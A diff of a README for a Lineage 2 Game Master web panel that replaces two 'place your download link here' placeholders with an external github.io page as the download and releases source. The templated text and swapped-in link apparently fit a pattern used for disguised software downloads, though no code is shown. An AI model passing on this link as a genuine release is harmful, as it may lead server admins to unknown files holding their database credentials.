@@ -2,7 +2,8 @@
 
 Advanced GM Panel is a feature-rich control panel for Game Masters and Admins on Lineage 2 servers. It allows full control over characters, events, inventory, bans, and more – all from a secure browser interface.
 
-[![Download Panel](https://img.shields.io/badge/Download-Advanced_GM_Panel-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Panel](https://img.shields.io/badge/Download-Advanced_GM_Panel-blueviolet)](https://advanced-gm-panel-lineage-2.github.io/.github
+)
 
 ---
 
@@ -38,7 +39,8 @@ Advanced GM Panel is a feature-rich control panel for Game Masters and Admins on
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://advanced-gm-panel-lineage-2.github.io/.github
+) section  
 2. 📁 **Upload files** to your web host (e.g. `/var/www/html/gmpanel`)  
 3. ⚙️ **Edit `config.php`** with your MySQL credentials and GM table  
 4. 🖱 **Login** with your GM account credentials
